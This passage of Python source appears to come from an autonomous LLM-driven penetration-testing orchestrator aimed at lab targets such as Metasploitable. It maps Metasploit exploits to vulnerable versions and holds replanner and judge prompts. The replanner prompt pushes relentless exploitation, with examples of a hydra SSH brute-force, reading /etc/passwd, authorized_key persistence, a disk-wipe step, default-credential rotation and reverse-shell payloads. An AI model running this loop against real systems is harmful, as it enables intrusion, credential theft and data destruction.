        return {
            "success": False, "actions": [],
            "summary": "Discovery skipped — no session available.",
        }

    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
    objective = _build_objective(node, graph, explore)

    findings = run_impact(
        target_ip=node.target_ip or graph.target_ip,
        objective=objective,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        prior_findings_summary="\n".join(prior_lines),
    )
    return dict(findings)


# =============================================================================
# MSF MODULE → TARGET REQUIREMENTS — programmatic version validation
# =============================================================================
#
# Maps MSF module names to the service/version they require.
# Used to reject replanner proposals that don't match the actual target.

MSF_MODULE_REQUIREMENTS: dict = {
    # ProFTPD
    "exploit/unix/ftp/proftpd_133c_backdoor": {
        "service_contains": "ftp",
        "version_contains": "1.3.3c",  # ONLY 1.3.3c, NOT 1.3.5
    },
    "exploit/unix/ftp/proftpd_modcopy_exec": {
        "service_contains": "ftp",
        "version_contains": "1.3.5",   # 1.3.5 (mod_copy)
    },
    # Samba
    "exploit/multi/samba/usermap_script": {
        "service_contains": "samba",
        # Vulnerable: 3.0.20 - 3.0.25rc3 only. NOT 4.x.
        "version_pattern": r"3\.0\.2[0-5]",
    },
    "exploit/linux/samba/is_known_pipename": {
        "service_contains": "samba",
        # Vulnerable: 3.5.0 to 4.6.4 (CVE-2017-7494)
        "version_pattern": r"(3\.[5-9]|3\.1[0-9]|4\.[0-5]|4\.6\.[0-4])",
    },
    # UnrealIRCd
    "exploit/unix/irc/unreal_ircd_3281_backdoor": {
        "service_contains": "irc",
        "version_contains": "Unreal",
    },
    # Rails
    "exploit/multi/http/rails_secret_deserialization": {
        "service_contains": "http",
        # Needs the Rails app actually serving on the configured RPORT
    },
    # Drupal
    "exploit/multi/http/drupal_drupageddon": {
        "service_contains": "http",
        "version_pattern": r"7\.([0-9]|[12][0-9]|3[01])(?!\d)",  # 7.0 - 7.31
    },
}


def _validate_msf_module_for_target(
    module: str, recon_findings: dict, log: logging.Logger,
) -> tuple[bool, str]:
    """
    Check if an MSF module is applicable to the target based on recon findings.

    Returns (ok, reason). If module is not in MSF_MODULE_REQUIREMENTS,
    returns (True, "no requirements known") — we don't block unknown modules.
    """
    if module not in MSF_MODULE_REQUIREMENTS:
        return True, "no version requirements known for this module"

    req = MSF_MODULE_REQUIREMENTS[module]
    ports = recon_findings.get("ports", [])
    if not ports:
        return False, "no ports in recon findings"

    service_filter = req.get("service_contains", "").lower()
    version_contains = req.get("version_contains", "")
    version_pattern = req.get("version_pattern", "")

    matching_ports = []
    for p in ports:
        service = (p.get("service", "") or "").lower()
        version = p.get("version", "") or ""
        if service_filter and service_filter not in service:
            continue
        # Check version constraints
        if version_contains and version_contains not in version:
            continue
        if version_pattern and not re.search(version_pattern, version):
            continue
        matching_ports.append(f"{p.get('port')}/{service} {version}")

    if matching_ports:
        return True, f"matching ports found: {', '.join(matching_ports)}"

    # Build a useful failure reason
    found_services = [
        f"{p.get('port')}/{p.get('service','')} {p.get('version','')}"
        for p in ports if service_filter in (p.get("service", "") or "").lower()
    ]
    reason = (
        f"no port matches requirements for {module} "
        f"(needs service~{service_filter!r}"
    )
    if version_contains:
        reason += f", version contains {version_contains!r}"
    if version_pattern:
        reason += f", version matches /{version_pattern}/"
    reason += ")"
    if found_services:
        reason += f". Found {service_filter} on: {found_services}"
    return False, reason


def _build_msf_module_checks(module: str) -> list[EdgeCheck]:
    """
    Build EdgeCheck objects from MSF_MODULE_REQUIREMENTS for a given module.
    These get attached to the edge so the walker enforces them on every traversal.
    """
    if module not in MSF_MODULE_REQUIREMENTS:
        return []

    req = MSF_MODULE_REQUIREMENTS[module]
    checks = []
    service_filter = req.get("service_contains", "")
    version_contains = req.get("version_contains", "")
    version_pattern = req.get("version_pattern", "")

    if service_filter and version_contains:
        # Composite check: any port with matching service AND version substring
        checks.append(EdgeCheck(
            field="ports",
            operator="any_port",
            expected={"service": service_filter, "version": version_contains},
            description=f"port with service~{service_filter} AND version~{version_contains} "
                        f"(required by {module})",
        ))
    elif service_filter:
        checks.append(EdgeCheck(
            field="ports",
            operator="any_port",
            expected={"service": service_filter},
            description=f"port with service~{service_filter} (required by {module})",
        ))
    # Note: version_pattern (regex) isn't directly expressible as an EdgeCheck operator,
    # so the programmatic validation in _validate_msf_module_for_target catches those.
    # The persisted check above provides a coarse safety net that survives JSON reload.
    return checks


def _gather_recon_findings(graph: AttackGraph) -> dict:
    """Find the most relevant recon findings in the graph (any node with ports)."""
    for node in graph.nodes.values():
        if node.status == NodeStatus.SUCCESS.value and node.findings.get("ports"):
            return node.findings
    return {}


# =============================================================================
# MSF MODULE CATALOG — ground-truth check that a proposed module actually exists
# =============================================================================
# Loaded lazily on first use; queries the connected MSF RPC. Different from
# MSF_MODULE_REQUIREMENTS (heuristic version table, advisory only): this is
# ground truth -- if MSF doesn't have the module, it cannot run, period.

_MSF_MODULE_CATALOG: Optional[set[str]] = None


def _load_msf_module_catalog(log: logging.Logger) -> set[str]:
    """Lazy-load and cache the set of all MSF module paths available on RPC.

    Returns an empty set on failure (network down, MSF not running, etc.) --
    which we treat as "catalog disabled" so we don't block proposals just
    because the cache couldn't be populated.
    """
    global _MSF_MODULE_CATALOG
    if _MSF_MODULE_CATALOG is not None:
        return _MSF_MODULE_CATALOG
    try:
        from tools.metasploit_tools import msf_session
        client = msf_session.client
        catalog: set[str] = set()
        for name in client.modules.exploits:
            catalog.add(f"exploit/{name}")
        for name in client.modules.auxiliary:
            catalog.add(f"auxiliary/{name}")
        for name in client.modules.post:
            catalog.add(f"post/{name}")
        _MSF_MODULE_CATALOG = catalog
        log.info(f"[MSF Catalog] Loaded {len(catalog)} modules from RPC")
    except Exception as e:
        log.warning(
            f"[MSF Catalog] Load failed ({e}) -- catalog validation disabled "
            f"for this run"
        )
        _MSF_MODULE_CATALOG = set()
    return _MSF_MODULE_CATALOG


def _module_exists_in_msf(module_path: str, log: logging.Logger) -> bool:
    """
    Ground-truth: does this module path actually exist in MSF's catalog?

    Returns True if the catalog is empty / unavailable -- failsafe so a
    disconnected MSF doesn't break the orchestrator. Returns False ONLY
    when the catalog is loaded AND the path is missing from it.
    """
    catalog = _load_msf_module_catalog(log)
    if not catalog:
        return True
    return module_path in catalog


def _cap_text(s: str, cap: int) -> str:
    """Truncate `s` to `cap` chars, preserving the tail (recent stderr is what matters)."""
    if not s or len(s) <= cap:
        return s or ""
    return "...[truncated]...\n" + s[-cap:]


def _recent_command_excerpts(node: AttackNode, n: int = 3, cap: int = 2048) -> list[dict]:
    """
    Return the last `n` CommandRecord entries from `node`, with each `output`
    capped at `cap` chars (tail preserved). Used to feed prose context — banners,
    stderr, exit codes — to the replanner, not just structured findings.
    """
    out = []
    for rec in node.commands[-n:]:
        out.append({
            "command": rec.command,
            "tool": rec.tool,
            "exit_code": rec.exit_code,
            "output_tail": _cap_text(rec.output or "", cap),
        })
    return out


# =============================================================================
# JUDGE — layer-2 strategic decision after each node attempt
# =============================================================================
#
# A small LLM call that runs at three trigger points:
#   post_retry — inside _execute_node after each failed attempt; decides whether
#                another retry will help or whether to escalate to the replanner.
#   post_node  — in run_graph after a node completes; decides whether to follow
#                the planned outgoing edges or jump straight to the replanner.
#   pre_replan — implicit in escalate decisions above.
#
# Output is a tiny intent: {action, hint}. Code interprets the action; the hint
# is for human readability in logs.

JUDGE_PROMPT = """You are a step-by-step strategic judge for an autonomous pentest.

After a node attempt, decide what to do NEXT. Choose ONE action:

  continue — Node succeeded, or failure is transient (timeout, race condition,
             port flapping). Proceed with the existing plan.
  adapt    — Node failed AND a parameter tweak (alt payload, alt path, alt
             credentials) plausibly fixes it. Only choose this if
             alternatives_remaining > 0 — otherwise the next retry will be
             identical.
  escalate — This approach is dead. The next retry will not help. Call the
             replanner now rather than burning more attempts.

Respond ONLY with JSON:
  {"action": "continue" | "adapt" | "escalate", "hint": "one short sentence"}

The hint should briefly explain your reasoning so it shows up in logs."""


def _format_session_privilege_line(graph: AttackGraph) -> str:
    """One-line summary of the most recently-acquired session's privilege.
    Empty string if no session has been opened yet."""
    for n in reversed(list(graph.nodes.values())):
        if n.status != NodeStatus.SUCCESS.value:
            continue
        priv = n.findings.get("session_user_info")
        if priv:
            return (
                f"SESSION PRIVILEGE: {priv.get('user')} (uid={priv.get('uid')}); "
                f"groups={priv.get('groups', [])}; "
                f"access_level={n.findings.get('access_level', 'unknown')}; "
                f"can_sudo={priv.get('in_sudo_group', False)}"
            )
    return ""


def _build_judge_context(trigger: str, node: AttackNode, graph: AttackGraph) -> str:
    """Minimal context: just node state, recent commands, edge count, privilege."""
    recent_cmds = _recent_command_excerpts(node, n=3, cap=1024)
    alternatives_remaining = max(0, node.max_retries - node.retries)
    outgoing_edges_count = len(graph.outgoing_edges(node.id))
    priv_line = _format_session_privilege_line(graph)

    parts = [
        f"TRIGGER: {trigger}",
        f"NODE: {node.id} ({node.label})",
        f"STATUS: {node.status}",
        f"RETRIES: {node.retries}/{node.max_retries}  "
        f"ALTERNATIVES_REMAINING: {alternatives_remaining}",
        f"LAST FAILURE: {node.metadata.get('last_failure_reason', '(none)')}",
        f"OUTGOING EDGES DEFINED: {outgoing_edges_count}",
    ]
    if priv_line:
        parts.append(priv_line)
    parts.append("")
    parts.append("RECENT COMMAND OUTPUT (last 3, tails capped at 1KB):")
    parts.append(json.dumps(recent_cmds, indent=2, default=str))
    return "\n".join(parts) + "\n"


def judge(
    trigger: str, node: AttackNode, graph: AttackGraph, log: logging.Logger,
) -> dict:
    """
    One LLM call. Returns {'action': 'continue'|'adapt'|'escalate', 'hint': str}.

    On any failure (LLM error, parse error, unknown action), defaults to
    'continue' so the existing flow is never broken by judge failures.
    """
    context = _build_judge_context(trigger, node, graph)
    log.debug(f"[Judge] Context ({trigger}, {len(context)} chars):\n{context}")

    try:
        resp = call_llm(
            messages=[HumanMessage(content=context)],
            system_prompt=JUDGE_PROMPT,
            model_name=JUDGE_MODEL_NAME,
        )
        result = parse_json_response(resp.content)
    except Exception as e:
        log.warning(f"[Judge] LLM call failed ({e}) — defaulting to continue")
        return {"action": "continue", "hint": "(judge call failed)"}

    action = result.get("action", "continue")
    if action not in ("continue", "adapt", "escalate"):
        log.warning(f"[Judge] Unknown action '{action}' — defaulting to continue")
        action = "continue"
    hint = result.get("hint", "")
    log.info(f"[Judge] {trigger}: {action} -- {hint}")
    return {"action": action, "hint": hint}


_COMMAND_REWRITE_PROMPT = """You rewrite a single failing shell command using a hint.
Output ONLY the rewritten command(s), one per line. No explanation. No backticks.
If multiple commands are needed to address the hint, list them in execution order.
If you can't improve it, output the original command unchanged."""


def _rewrite_commands_with_hint(
    node: AttackNode, hint: str, log: logging.Logger,
) -> Optional[list[str]]:
    """
    Ask the LLM to rewrite the failing command(s) given the judge's adapt hint.
    Used when judge says `adapt` for a session/SSH-command node that has no
    pre-configured `command_params_alternatives` to cycle through.

    Returns the new list of commands or None on failure (caller keeps original).
    """
    if not node.commands_to_run or not hint.strip():
        return None
    last_rec = node.commands[-1] if node.commands else None
    last_cmd = last_rec.command if last_rec else node.commands_to_run[-1]
    last_output = (last_rec.output if last_rec else "")[-500:]

    user_msg = (
        f"Original commands (current `commands_to_run`):\n"
        + "\n".join(f"  {c}" for c in node.commands_to_run)
        + f"\n\nLast attempted command: {last_cmd}\n"
        f"Last command output (last 500 chars):\n{last_output}\n\n"
        f"Judge hint: {hint}\n\n"
        f"Rewrite the commands."
    )
    try:
        resp = call_llm(
            messages=[HumanMessage(content=user_msg)],
            system_prompt=_COMMAND_REWRITE_PROMPT,
            model_name=JUDGE_MODEL_NAME,
        )
        text = (resp.content or "").strip()
    except Exception as e:
        log.warning(f"[Judge adapt] command rewrite LLM call failed: {e}")
        return None

    # Strip code fences if the LLM added them despite instructions
    text = re.sub(r"^```\w*\n", "", text)
    text = re.sub(r"\n```$", "", text)
    new_cmds = [line.strip() for line in text.split("\n") if line.strip()]
    if not new_cmds:
        return None
    # Cap to keep things sane
    return new_cmds[:8]


def _try_replanner(
    graph: AttackGraph, current: str, log: logging.Logger,
    checkpoint_path: str, replan_attempts: int, max_replan_attempts: int,
    explore: bool, dead_nodes: set = None,
) -> tuple[Optional[str], int]:
    """
    Try to replan from `current`. Returns (new_target_or_None, updated_attempts).

    Returns (None, replan_attempts) without firing the LLM if explore is off,
    the budget is exhausted, or the LLM gave up.

    P1 fix: `dead_nodes` is the set of nodes that already failed non-retryably
    (deterministic). If the replanner proposes re-routing to one of them, we
    REJECT it — re-running a dead node just burns time (flaw_privesc looped on a
    time-boxed escalate ~2× 300s before progressing). Rejecting keeps the cheap
    LLM replan but never re-EXECUTES the dead node.
    """
    if not explore:
        return None, replan_attempts
    dead_nodes = dead_nodes or set()
    # F19: keep spending the replan budget instead of giving up after ONE rejected
    # proposal. Previously a single dead-node re-point OR a rejected use_module
    # (anti-repetition on the just-failed exploit) returned None -> "Path exhausted",
    # wasting attempts 2..N and defeating recovery (flawed / flaw_initial_access /
    # goal_only capped at ~25%; unrealircd never tried ProFTPD/Samba after the backdoor
    # failed). Now we re-ask; the DEAD-NODES block + accumulating failed context steer
    # each retry to a DIFFERENT vector until one is accepted or the budget runs out.
    while replan_attempts < max_replan_attempts:
        replan_attempts += 1
        log.info(
            f"[Orchestrator] Replan attempt {replan_attempts}/{max_replan_attempts} "
            f"from '{current}'"
        )
        new_target = _replan_from(graph, current, log, dead_nodes=dead_nodes)
        if new_target and new_target in dead_nodes:
            log.warning(
                f"[Orchestrator] Replanner targeted '{new_target}' (dead) — "
                f"re-asking for a different vector."
            )
            continue
        if new_target:
            _checkpoint(graph, checkpoint_path, log)
            return new_target, replan_attempts
        # None: proposal rejected (dead / already-tried / not-in-catalog) or the LLM
        # gave up. Re-ask up to budget — the updated dead/failed context steers a
        # different proposal (e.g. ProFTPD after UnrealIRCd failed).
        log.info("[Orchestrator] Replan proposal rejected/empty — re-asking.")
    log.info(
        f"[Orchestrator] Replan budget exhausted "
        f"({replan_attempts}/{max_replan_attempts})"
    )
    return None, replan_attempts


# =============================================================================
# REPLANNER — grow new edges/nodes when the graph is stuck
# =============================================================================

REPLAN_PROMPT = """You are an attack graph replanner for an autonomous penetration testing system.

You are STUCK at a specific node. The pre-planned path is blocked. Your job:
propose the SMALLEST POSSIBLE INTENT for the next step.

DO NOT emit full module options, payload params, or command parameter dicts.
The system will fill in RHOSTS/LHOST/LPORT/RPORT defaults from graph context.
Just tell us WHAT to try next.

You will receive: objective, target IP, attacker IP, detected services,
recent command output, failed edges, and remaining unreached nodes.

RESPOND WITH EXACTLY ONE of these JSON shapes:

1) Use an MSF module (system fills RHOSTS/LHOST/LPORT/RPORT defaults):
   {"action": "use_module",
    "target_hint": "exploit/unix/ftp/proftpd_modcopy_exec",
    "label": "ProFTPD modcopy RCE",
    "goal": "Get shell via FTP",
    "rationale": "ProFTPD 1.3.5 on port 21 -- known mod_copy RCE"}

1b) Use an MSF module with SPECIFIC options (optional `module_options` /
    `payload_options` override the defaults — use this to retry a module with
    DIFFERENT credentials or settings, e.g. after root/root failed):
   {"action": "use_module",
    "target_hint": "auxiliary/scanner/ssh/ssh_login",
    "module_options": {"USERNAME": "vagrant", "PASSWORD": "vagrant"},
    "rationale": "root/root failed -- try the common Metasploitable creds"}

2) Run raw terminal commands (newline-separated) — a FIRST-CLASS way to GAIN ACCESS,
   not just to verify after. With NO session yet, these run on the Kali box to attack the
   target directly — reach for this whenever an MSF module isn't the best fit: `curl`/
   `python`/`wget` a PoC or command-injection, `hydra`/`medusa` a login, `smbclient`, a
   crafted reverse shell. With a session, the SAME action runs ON THE TARGET (enumerate/pivot).
   Initial-access example (no session — runs on Kali against the target):
   {"action": "run_commands",
    "target_hint": "hydra -l vagrant -p vagrant ssh://192.168.34.7",
    "label": "SSH credential attack", "goal": "Get a login",
    "rationale": "SSH open, no clean MSF fit -- brute a known lab credential"}
   Post-session example (session exists — runs on target):
   {"action": "run_commands",
    "target_hint": "id\\ncat /etc/passwd",
    "label": "Read passwd", "goal": "Confirm access",
    "rationale": "Session open; enumerate before pivoting"}

3) Connect to an existing unreached node:
   {"action": "new_edge",
    "target_hint": "<existing_node_id>",
    "rationale": "current findings satisfy that node's preconditions"}

4) Grow the NEXT technique (ONLY when a MITRE TECHNIQUE MENU is shown above —
   i.e. you are stuck at a persistence-type node). Pick an AVAILABLE technique
   from the menu; NEVER a TRIED or N/A one. You choose the TECHNIQUE; the subagent
   chooses the procedure under it, so do NOT spell out commands here.
   {"action": "grow_technique",
    "technique_id": "T1098.004",
    "rationale": "cron failed to fire; SSH is open (port 22) — inject an authorized_key"}

Rules:
- *** When a MITRE TECHNIQUE MENU is shown, STRONGLY PREFER action=grow_technique
    with the next AVAILABLE technique over freelancing run_commands/use_module. The
    subagent owns the procedure; your job is to pick the technique. Only fall back
    to another action when the menu shows NO AVAILABLE technique (all TRIED/N/A).
- NEVER conclude you are stuck while any DETECTED SERVICE still has an untried
  exploitation vector. There is almost always another move: a DIFFERENT service's
  exploit, the SAME service via a DIFFERENT technique (MSF module OR raw bash —
  curl/python/hydra/manual via `run_commands`), UNTRIED credentials, or re-running
  recon with a different scan (`-p-`, `-sU`, `-sC`) to surface a missed port/service.
  Enumerate the DETECTED SERVICES and pick the next untried vector every time.
- *** STRONGLY PREFER `new_edge` when any REMAINING NODE has
    `preconditions_met: true` (look for the `note: READY` marker). The
    pre-planned chain is closest to achieving the OBJECTIVE; skip-connect to
    it instead of spinning up new freelance steps. Example: if you have a
    session and `disk_wipe` shows `preconditions_met: true`, emit
    {"action": "new_edge", "target_hint": "disk_wipe", "rationale": "..."}.
    EXCEPTION: if a MITRE TECHNIQUE MENU is shown (a tactic like persistence
    FAILED but has an AVAILABLE technique), `grow_technique` for that tactic
    takes PRECEDENCE — finish the failed tactic before skip-connecting past it
    to a later READY node. Do NOT skip persistence to reach impact/file_drop
    while a persistence technique is still AVAILABLE.
- For use_module: target_hint is JUST the module path. Don't include options.
- For run_commands: target_hint is the literal command(s). The system picks
  session vs. SSH based on whether an active session exists.
- For new_edge: target_hint must be a PENDING/BLOCKED node id (NOT FAILED)
  shown in REMAINING NODES.
- *** NEVER propose a module path or command that already appears in the
    FAILED entries of REMAINING NODES. *** Read those entries' `module` and
    `commands_to_run` fields carefully -- if it's there, it already failed.
- *** CREDENTIAL ROTATION FIRST: if a FAILED node in REMAINING NODES has
    `failure_category: auth_failed`, the LOGIN itself failed — the service and
    module are fine, only the credentials were wrong. STRONGLY PREFER retrying
    that SAME module with DIFFERENT credentials (shape 1b, setting
    module_options.USERNAME and .PASSWORD) BEFORE switching to a different attack
    vector. Read that node's `module_options` to see which creds already failed
    and pick an UNTRIED pair. Common Metasploitable / lab credentials, one per
    replan: vagrant/vagrant, msfadmin/msfadmin, admin/admin, root/toor,
    ubuntu/ubuntu. Only switch vectors once the plausible credential pairs are
    exhausted.
- DIVERSIFY across replans: if FTP didn't work, try Samba / IRC / HTTP / etc.
  Each replan should try a SUBSTANTIALLY different vector.
- Match exploits to the DETECTED SERVICES versions you see in the context.
  Note: version mismatches are warnings, not rejections -- they can still run.
- ONE proposal per call. Concrete. No placeholders like "..." or "<ip>".
"""


# Common-service → default port table. Used by _guess_rport_from_module
# to fill RPORT when the LLM doesn't include it.
_MODULE_DEFAULT_PORTS: list[tuple[str, int]] = [
    ("proftpd", 21), ("vsftpd", 21), ("/ftp/", 21),
    ("/ssh/", 22),
    ("/smtp/", 25),
    ("/dns/", 53),
    ("/http/", 80), ("rails", 80), ("drupal", 80), ("wordpress", 80),
    ("/pop3/", 110),
    ("/imap/", 143),
    ("/https/", 443),
    ("samba", 445), ("smb", 445), ("netbios", 445),
    ("mysql", 3306),
    ("postgres", 5432),
    ("/vnc/", 5900),
    ("unreal_ircd", 6667), ("/irc/", 6667),
    ("/rmi/", 1099),
]


def _guess_rport_from_module(module: str) -> Optional[int]:
    """Heuristic: infer the typical target port from common MSF module name patterns."""
    m = module.lower()
    for needle, port in _MODULE_DEFAULT_PORTS:
        if needle in m:
            return port
    return None


def _config_key(module: str, options: dict) -> tuple:
    """Stable (module, sorted-options) tuple for anti-repeat detection.

    Comparing the full option set — not just the module path — lets the
    replanner legitimately retry the SAME module with DIFFERENT options (the
    canonical case: ssh_login with new credentials after root/root failed),
    while still blocking a literal re-run of the same module+options that
    already failed. Shared options (RHOSTS/RPORT) are identical across attempts
    so they don't affect the comparison; the discriminating options
    (USERNAME/PASSWORD/TARGETURI/...) are what make two configs distinct."""
    return (
        str(module or ""),
        tuple(sorted((str(k), str(v)) for k, v in (options or {}).items())),
    )


def _expand_intent_to_node(
    intent: dict, graph: AttackGraph, stuck_node: AttackNode,
) -> Optional[AttackNode]:
    """
    Expand a tiny LLM intent into a full AttackNode.

    The LLM emits {action, target_hint, label?, goal?, rationale}.
    This helper fills in agent_type, tool_name, target_ip, module_options
    (RHOSTS, RPORT) and payload_options (LHOST, LPORT) from graph context.

    Returns None for malformed or unsupported intents.
    """
    action = intent.get("action", "")
    target_hint = (intent.get("target_hint") or "").strip()
    if not target_hint:
        return None

    # Build a sanitized, unique node id from the target_hint
    raw = target_hint.rsplit("/", 1)[-1].split("\n", 1)[0].split()[0][:40]
    raw = "".join(c if c.isalnum() else "_" for c in raw).strip("_") or "replan_node"
    nid = raw
    suffix = 1
    while nid in graph.nodes:
        suffix += 1
        nid = f"{raw}_{suffix}"

    has_session = any(
        n.findings.get("session_id")
        for n in graph.nodes.values()
        if n.status == NodeStatus.SUCCESS.value
    )

    label = (intent.get("label") or f"Replan: {target_hint[:60]}").strip()
    goal = (intent.get("goal") or "Continue toward objective via replanner").strip()

    if action == "use_module":
        module_options = {"RHOSTS": graph.target_ip}
        rport = _guess_rport_from_module(target_hint)
        if rport:
            module_options["RPORT"] = rport
        payload_options = {"LHOST": graph.attacker_ip, "LPORT": 4444}
        # Stage X: let the intent override/extend the defaults. This is how the
        # replanner expresses "same module, DIFFERENT options" — chiefly new
        # credentials (USERNAME/PASSWORD) for a credential attack that failed.
        # Absent fields keep the defaults (backward-compatible). Intent wins on
        # conflicts (the LLM may know a better RHOSTS/TARGETURI/etc.).
        intent_mod_opts = intent.get("module_options")
        if isinstance(intent_mod_opts, dict):
            module_options = {**module_options, **intent_mod_opts}
        intent_pay_opts = intent.get("payload_options")
        if isinstance(intent_pay_opts, dict):
            payload_options = {**payload_options, **intent_pay_opts}
        return AttackNode(
            id=nid,
            label=label,
            goal=goal,
            agent_type="exploit",
            objective=f"Run {target_hint} against {graph.target_ip}",
            target_ip=graph.target_ip,
            tool_name="metasploit",
            module=target_hint,
            module_options=module_options,
            payload_options=payload_options,
            max_retries=3,
            tags=["replanner_generated", "intent_expanded"],
        )

    if action == "run_commands":
        commands = [c.strip() for c in target_hint.split("\n") if c.strip()]
        if not commands:
            return None
        tool_name = "session" if has_session else "ssh"
        agent_type = "impact" if has_session else "discovery"
        return AttackNode(
            id=nid,
            label=label,
            goal=goal,
            agent_type=agent_type,
            objective=f"Run shell commands toward: {goal}",
            target_ip=graph.target_ip,
            tool_name=tool_name,
            commands_to_run=commands,
            max_retries=2,
            tags=["replanner_generated", "intent_expanded"],
        )

    return None  # Unsupported action


def _is_tactic_node(node: AttackNode, tactic: str) -> bool:
    """True if a node belongs to a MITRE tactic (by explicit tactic or agent_type)."""
    return (node.tactic or "").lower() == tactic or node.agent_type == tactic


def _failed_techniques(graph: AttackGraph, tactic: str) -> set:
    """Slugs of techniques already tried-and-failed for a tactic across the graph.

    FINDINGS-based, not status-gated: the walker resets a node's status on
    backtrack (a judge_escalate'd persist node is no longer FAILED when the
    replanner runs from its predecessor), but its findings persist. So we count any
    non-SUCCESS tactic node carrying a failure signal — FAILED status, a
    failure_category, technique_exhausted, or success=False with a method. Resolves
    the technique via the node's assigned technique_id/name, else the findings
    `method`. Feeds both the replanner menu (mark TRIED) and the grow_technique guard."""
    failed = set()
    for n in graph.nodes.values():
        if not _is_tactic_node(n, tactic) or n.status == NodeStatus.SUCCESS.value:
            continue
        f = n.findings or {}
        failed_signal = (
            n.status == NodeStatus.FAILED.value
            or f.get("failure_category")
            or f.get("technique_exhausted")
            or (f.get("success") is False and f.get("method"))
        )
        if not failed_signal:
            continue
        t = (mitre.get_technique(tactic, n.technique_id)
             or mitre.get_technique(tactic, n.technique_name))
        if t:
            failed.add(t.slug)
            continue
        method = (f.get("method") or "").strip().lower()
        if method and method != "unknown":
            failed.add(method)
    return failed


def _tactic_satisfied(graph: AttackGraph, tactic: str) -> bool:
    """True if any node of this tactic already SUCCEEDED (don't grow more)."""
    return any(n.status == NodeStatus.SUCCESS.value and _is_tactic_node(n, tactic)
               for n in graph.nodes.values())


def _current_session_context(graph: AttackGraph) -> tuple[str, str]:
    """Best-effort (access_level, session_type) of the live session, for menu
    privilege/session gating. Defaults ('unknown','command_shell') — 'unknown' is
    treated as root-capable, so no technique is wrongly hidden."""
    for n in graph.nodes.values():
        if n.status == NodeStatus.SUCCESS.value and n.findings.get("session_id"):
            stype = (n.findings.get("session_type") or "command_shell")
            stype = "meterpreter" if "meterpreter" in stype else "command_shell"
            return (n.findings.get("access_level") or "unknown"), stype
    return "unknown", "command_shell"


def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger,
                 dead_nodes: set = None) -> Optional[str]:
    """
    Attempt to grow a new edge from a stuck node.

    Called when the walker reaches a node whose outgoing edges all fail their checks.
    Asks the LLM to propose the next step from this specific node.

    Returns the target node ID to continue to, or None if replanning failed.
    """
    stuck_node = graph.nodes[stuck_node_id]
    log.info(f"[Replanner] Stuck at '{stuck_node_id}' — asking LLM for next step...")

    # Build context — keep everything, but cap raw_nmap_output at 8 KB
    # so a 200 KB scan dump doesn't blow the context window.
    full_findings = dict(stuck_node.findings)
    if "raw_nmap_output" in full_findings:
        full_findings["raw_nmap_output"] = _cap_text(
            full_findings["raw_nmap_output"], 8192,
        )

    # Failed outgoing edges — include target node's goal
    failed_edges = []
    for edge in graph.outgoing_edges(stuck_node_id):
        failed_checks = []
        for check in edge.checks:
            if not check.evaluate(stuck_node.findings):
                failed_checks.append(str(check))
        if failed_checks or not graph._edge_satisfied(edge):
            target_node = graph.nodes[edge.target]
            failed_edges.append({
                "target": edge.target,
                "target_label": target_node.label,
                "target_goal": target_node.goal,
                "target_objective": target_node.objective[:200],
                "failed_checks": failed_checks,
                "rationale": edge.rationale,
            })

    # Compute whether we currently have an active session — this is the
    # most common precondition for session-based nodes (persistence,
    # disk_wipe, etc.) being immediately reachable from the current state.
    _has_session = any(
        n.findings.get("session_id")
        for n in graph.nodes.values()
        if n.status == NodeStatus.SUCCESS.value
    )

    # Remaining unreached nodes — include goals and failure info.
    # PENDING/BLOCKED nodes are annotated with whether they are NOW reachable,
    # so the LLM can use `new_edge` to skip-connect from the current node to a
    # planned node whose preconditions are met -- instead of always spinning
    # up a new exploration step.
    remaining = {}
    for nid, node in graph.nodes.items():
        if node.status in (NodeStatus.PENDING.value, NodeStatus.BLOCKED.value):
            needs_session = node.tool_name == "session"
            preconditions_met = (not needs_session) or _has_session
            entry: dict = {
                "label": node.label,
                "goal": node.goal,
                "agent_type": node.agent_type,
                "objective": node.objective[:200],
                "tool_name": node.tool_name,
                # Annotation so the LLM can prefer reconnecting (new_edge) over
                # freelance new_node when a planned step is already reachable.
                "needs_session": needs_session,
                "preconditions_met": preconditions_met,
            }
            if preconditions_met:
                entry["note"] = (
                    "READY -- you can connect to this node with action=new_edge"
                )
            remaining[nid] = entry
        elif node.status == NodeStatus.FAILED.value:
            remaining[nid] = {
                "label": node.label,
                "goal": node.goal,
                "status": "FAILED — DO NOT propose this same approach again",
                "module": node.module,                          # what was tried
                # Stage X: show the options that failed (esp. USERNAME/PASSWORD)
                # so the replanner can retry the SAME module with DIFFERENT creds
                # rather than blindly switching attack vector.
                "module_options": node.module_options,
                "commands_to_run": node.commands_to_run[:3],    # first 3 cmds
                "failure_reason": node.metadata.get("last_failure_reason", "unknown"),
                # Stage C: specific category + phrase so the LLM can pivot
                # intelligently. e.g. writable_path_missing -> try a different
                # SITEPATH; wrong_targeturi -> try a different path; etc.
                "failure_category": node.findings.get("failure_category", "generic"),
                "failure_cause": node.findings.get("failure_cause", ""),
            }

    # Always surface recon findings (services + versions) explicitly,
    # even if the stuck node isn't the recon node — the replanner needs
    # version info to pick compatible exploits.
    recon_findings = _gather_recon_findings(graph)
    detected_services = []
    if recon_findings.get("ports"):
        for p in recon_findings["ports"]:
            detected_services.append({
                "port": p.get("port"),
                "service": p.get("service", ""),
                "version": p.get("version", ""),
            })

    # Recent raw command output — what an operator would actually read
    # (banners, stderr, exit codes) — not just typed findings.
    recent_cmds = _recent_command_excerpts(stuck_node, n=3, cap=2048)

    # Stage B: surface the current session's user/privilege so the LLM
    # doesn't propose root-only operations as an unprivileged user.
    priv_line = _format_session_privilege_line(graph)
    priv_block = f"{priv_line}\n\n" if priv_line else ""

    # dead_block (DEAD NODES guidance) is built AFTER tech_block below so it can be
    # session/technique-aware: a dead POST-exploitation node (persistence) means "try
    # another TECHNIQUE", not "re-exploit for a new shell" — see V3 note below.
    dead_block = ""

    # MITRE technique menu — inject when a tactic with a catalog menu (persistence
    # is the wired prototype) still has an AVAILABLE technique to try. This fires
    # either when the stuck node IS that tactic, OR when a node of that tactic
    # already FAILED and the walker backtracked to a PREDECESSOR (the common case:
    # persist fails → walker replans from gain_access). The replanner picks the next
    # AVAILABLE technique to grow; the subagent owns the procedure. Failed techniques
    # are marked TRIED. Skipped once the tactic is satisfied or its menu is exhausted.
    tech_block = ""
    for _tactic in ("persistence",):
        if not mitre.technique_menu(_tactic) or _tactic_satisfied(graph, _tactic):
            continue
        _failed = _failed_techniques(graph, _tactic)
        stuck_here = _is_tactic_node(stuck_node, _tactic)
